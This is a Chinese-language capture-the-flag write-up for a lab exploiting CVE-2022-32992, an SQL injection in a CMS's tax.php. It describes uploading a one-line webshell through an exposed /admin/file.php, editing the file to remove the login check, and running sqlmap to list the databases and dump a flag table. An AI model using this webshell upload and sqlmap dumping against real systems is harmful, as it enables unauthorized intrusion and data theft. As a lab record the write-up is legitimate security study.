> https://yunjing.ichunqiu.com/cve/detail/751
> #Webshell #SQL-Injection

> 该CMS的admin/operations/tax.php中存在可控的INSERT 语句参数，从而导致了SQL注入攻击。
> https://nvd.nist.gov/vuln/detail/CVE-2022-32992

首先是目录扫描的结果：
![[Pasted image 20230112165244.png]]

可以发现一个比较奇怪的入口点：`/admin/file.php`，访问后显示为：
![[Pasted image 20230112165336.png]]

使用基本的一句话直接上传，蚁剑连接：
![[Pasted image 20230112165623.png]]

通过公开信息，可以得知漏洞的所在点：
![[Pasted image 20230112165855.png]]

在未登录的情况下，无法正常与`/admin/operations/tax.php`进行交互，于是对`/admin/operations/tax.php`进行修改：
![[Pasted image 20230112170544.png]]

注释后，页面不再要求登录，就可以使用sqlmap进行尝试：
```shell
sqlmap -u http://eci-2zehq6dhrwkmdzgiaplq.cloudeci1.ichunqiu.com/admin/operations/tax.php?id=1 --dbs
available databases [4]:
[*] ctf
[*] information_schema
[*] mysql
[*] performance_schema

sqlmap -u http://eci-2zehq6dhrwkmdzgiaplq.cloudeci1.ichunqiu.com/admin/operations/tax.php?id=1 -D ctf --tables
Database: ctf
[18 tables]
+------------------+
| admin            |
| booking          |
| booking_payment  |
| booking_report   |
| currency         |
| demo             |
| email_setup      |
| expense          |
| expense_category |
| flag             |
| packages         |
| payment          |
| payment_type     |
| register         |
| settings         |
| sms_setting      |
| tax              |
| travellers       |
+------------------+

sqlmap -u http://eci-2zehq6dhrwkmdzgiaplq.cloudeci1.ichunqiu.com/admin/operations/tax.php?id=1 -D ctf -T flag --dump
Database: ctf
Table: flag
[1 entry]
+--------------------------------------------+
| flag                                       |
+--------------------------------------------+
| flag{5b54eaba-b2b1-48a4-9496-8b73020ec798} |
+--------------------------------------------+
```
